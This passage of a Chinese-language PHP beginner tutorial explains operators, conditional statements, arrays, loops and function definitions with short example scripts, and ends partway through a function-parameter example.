<h2 id="递增-x2F-递减运算符"><a href="#递增-x2F-递减运算符" class="headerlink" title="递增&#x2F;递减运算符"></a>递增&#x2F;递减运算符</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">10</span>; </span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$x</span>; <span class="comment">// 输出11</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$y</span>=<span class="number">10</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>++; <span class="comment">// 输出10</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$z</span>=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> --<span class="variable">$z</span>; <span class="comment">// 输出4</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$i</span>=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>--; <span class="comment">// 输出5</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">100</span>; </span><br><span class="line"><span class="variable">$y</span>=<span class="string">&quot;100&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span> == <span class="variable">$y</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span> === <span class="variable">$y</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span> != <span class="variable">$y</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span> !== <span class="variable">$y</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="number">50</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">90</span>;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> &gt; <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> &lt; <span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(expr1) ? (expr2) : (expr3) </span><br></pre></td></tr></table></figure></div>

<p>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p>
<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><p>您编写代码时，您常常需要为不同的判断执行不同的动作。您可以在代码中使用条件语句来完成此任务。</p>
<p>在 PHP 中，提供了下列条件语句：</p>
<ul>
<li><strong>if 语句</strong> - 在条件成立时执行代码</li>
<li><strong>if…else 语句</strong> - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li>
<li><strong>if…elseif….else 语句</strong> - 在若干条件之一成立时执行一个代码块</li>
<li><strong>switch 语句</strong> - 在若干条件之一成立时执行一个代码块</li>
</ul>
<p>if 语句用于<strong>仅当指定条件成立时执行代码</strong></p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">    条件成立时要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$t</span>&lt;<span class="string">&quot;20&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Have a good day!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="if…else-语句"><a href="#if…else-语句" class="headerlink" title="if…else 语句"></a>if…else 语句</h2><p><strong>在条件成立时执行一块代码，条件不成立时执行另一块代码</strong>，请使用 if….else 语句。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">条件不成立时执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$t</span>&lt;<span class="string">&quot;20&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Have a good day!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Have a good night!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="if…elseif…-else-语句"><a href="#if…elseif…-else-语句" class="headerlink" title="if…elseif….else 语句"></a>if…elseif….else 语句</h2><p><strong>在若干条件之一成立时执行一个代码块</strong>，请使用 if….elseif…else 语句。.</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">    if 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">elseif (条件)</span><br><span class="line">&#123;</span><br><span class="line">    elseif 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    条件不成立时执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$t</span>&lt;<span class="string">&quot;10&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Have a good morning!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$t</span>&lt;<span class="string">&quot;20&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Have a good day!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Have a good night!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="Switch-语句"><a href="#Switch-语句" class="headerlink" title="Switch 语句"></a>Switch 语句</h1><p>switch 语句用于根据多个不同条件执行不同动作。</p>
<p>如果您希望<strong>有选择地执行若干代码块之一</strong>，请使用 switch 语句。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$favcolor</span>=<span class="string">&quot;red&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$favcolor</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;red&quot;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色是红色!&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;blue&quot;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色是蓝色!&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;green&quot;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色是绿色!&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="数组-1"><a href="#数组-1" class="headerlink" title="数组"></a>数组</h1><p>数组能够在单个变量中存储多个值</p>
<p>数组可以在单个变量中存储多个值，并且您可以根据键访问其中的值。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I like &quot;</span> . <span class="variable">$cars</span>[<span class="number">0</span>] . <span class="string">&quot;, &quot;</span> . <span class="variable">$cars</span>[<span class="number">1</span>] . <span class="string">&quot; and &quot;</span> . <span class="variable">$cars</span>[<span class="number">2</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><p>在 PHP 中，array() 函数用于创建数组：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">array();</span><br></pre></td></tr></table></figure></div>



<p>在 PHP 中，有三种类型的数组：</p>
<ul>
<li><strong>数值数组</strong> - 带有数字 ID 键的数组</li>
<li><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</li>
<li><strong>多维数组</strong> - 包含一个或多个数组的数组</li>
</ul>
<h2 id="数值数组"><a href="#数值数组" class="headerlink" title="数值数组"></a>数值数组</h2><p>这里有两种创建数值数组的方法：</p>
<p>自动分配 ID 键（ID 键总是从 0 开始）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I like &quot;</span> . <span class="variable">$cars</span>[<span class="number">0</span>] . <span class="string">&quot;, &quot;</span> . <span class="variable">$cars</span>[<span class="number">1</span>] . <span class="string">&quot; and &quot;</span> . <span class="variable">$cars</span>[<span class="number">2</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="获取数组的长度-count-函数"><a href="#获取数组的长度-count-函数" class="headerlink" title="获取数组的长度 - count() 函数"></a>获取数组的长度 - count() 函数</h2><p>count() 函数用于返回数组的长度（元素的数量）</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h2><p>遍历并打印数值数组中的所有值，您可以使用 for 循环</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="variable">$arrlength</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="variable">$x</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h2><p>关联数组是使用您分配给数组的指定的键的数组。</p>
<p>这里有两种创建关联数组的方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">$age[&#x27;Peter&#x27;]=&quot;35&quot;;</span><br><span class="line">$age[&#x27;Ben&#x27;]=&quot;37&quot;;</span><br><span class="line">$age[&#x27;Joe&#x27;]=&quot;43&quot;;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Peter is &quot;</span> . <span class="variable">$age</span>[<span class="string">&#x27;Peter&#x27;</span>] . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h2><p>遍历并打印关联数组中的所有值，您可以使用 foreach 循环</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$age</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$x_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Key=&quot;</span> . <span class="variable">$x</span> . <span class="string">&quot;, Value=&quot;</span> . <span class="variable">$x_value</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><p>循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。</p>
<p>在 PHP 中，提供了下列循环语句：</p>
<ul>
<li><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</li>
<li><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li>
<li><strong>for</strong> - 循环执行代码块指定的次数</li>
<li><strong>foreach</strong> - 根据数组中每个元素来循环代码块</li>
</ul>
<h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h2><p>while 循环将重复执行代码块，直到指定的条件不成立。</p>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">while (条件)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>实例首先设置变量 <em>i</em> 的值为 1 ($i&#x3D;1;)。</p>
<p>然后，只要 <em>i</em> 小于或者等于 5，while 循环将继续运行。循环每运行一次，<em>i</em> 就会递增 1：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$i=1;</span></span><br><span class="line"><span class="meta">while($i&lt;=5)</span></span><br><span class="line"><span class="meta">&#123;</span></span><br><span class="line"><span class="meta">    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="meta">    $i++;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="do…while-语句"><a href="#do…while-语句" class="headerlink" title="do…while 语句"></a>do…while 语句</h2><p>do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p>
<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">while (条件);</span><br></pre></td></tr></table></figure></div>



<p>实例首先设置变量 <em>i</em> 的值为 1 ($i&#x3D;1;)。</p>
<p>然后，开始 do…while 循环。循环将变量 <em>i</em> 的值递增 1，然后输出。先检查条件（<em>i</em> 小于或者等于 5），只要 <em>i</em> 小于或者等于 5，循环将继续运行</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The number is &quot;</span> . <span class="variable">$i</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span>&lt;=<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>



<h1 id="For-循环"><a href="#For-循环" class="headerlink" title="For 循环"></a>For 循环</h1><p>for 循环用于您预先知道脚本需要运行的次数的情况。</p>
<h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (初始值; 条件; 增量)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>参数：</p>
<ul>
<li><strong>初始值</strong>：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。</li>
<li><strong>条件</strong>：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。</li>
<li><strong>增量</strong>：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。</li>
</ul>
<p><strong>注释：</strong>上面的<strong>初始值</strong>和<strong>增量</strong>参数可为空，或者有多个表达式（用逗号分隔）。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>下面的实例定义一个初始值为 i&#x3D;1 的循环。只要变量 <strong>i</strong> 小于或者等于 5，循环将继续运行。循环每运行一次，变量 <strong>i</strong> 就会递增 1</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span>&lt;=<span class="number">5</span>; <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数字为 &quot;</span> . <span class="variable">$i</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="foreach-循环"><a href="#foreach-循环" class="headerlink" title="foreach 循环"></a>foreach 循环</h2><p>foreach 循环用于遍历数组。</p>
<h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach ($array as $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="string">&quot;Google&quot;</span>,<span class="string">&quot;Runoob&quot;</span>,<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  为 &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;，对应的 value 为 &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="创建-PHP-函数"><a href="#创建-PHP-函数" class="headerlink" title="创建 PHP 函数"></a>创建 PHP 函数</h2><p>函数是通过调用函数来执行的。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>函数准则：</p>
<ul>
<li>函数的名称应该提示出它的功能</li>
<li>函数名称以字母或下划线开头（不能以数字开头）</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Kai Jim Refsnes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My name is &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">writeName</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="函数-添加参数"><a href="#函数-添加参数" class="headerlink" title="函数 - 添加参数"></a>函数 - 添加参数</h2><p>为了给函数添加更多的功能，我们可以添加参数，参数类似变量。</p>
<p>参数就在函数名称后面的一个括号内指定。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span>(<span class="params"><span class="variable">$fname</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fname</span> . <span class="string">&quot; Refsnes.&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My name is &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">writeName</span>(<span class="string">&quot;Kai Jim&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My sister&#x27;s name is &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">writeName</span>(<span class="string">&quot;Hege&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My brother&#x27;s name is &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">writeName</span>(<span class="string">&quot;Stale&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$punctuation</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fname</span> . <span class="string">&quot; Refsnes&quot;</span> . <span class="variable">$punctuation</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My name is &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">writeName</span>(<span class="string">&quot;Kai Jim&quot;</span>,<span 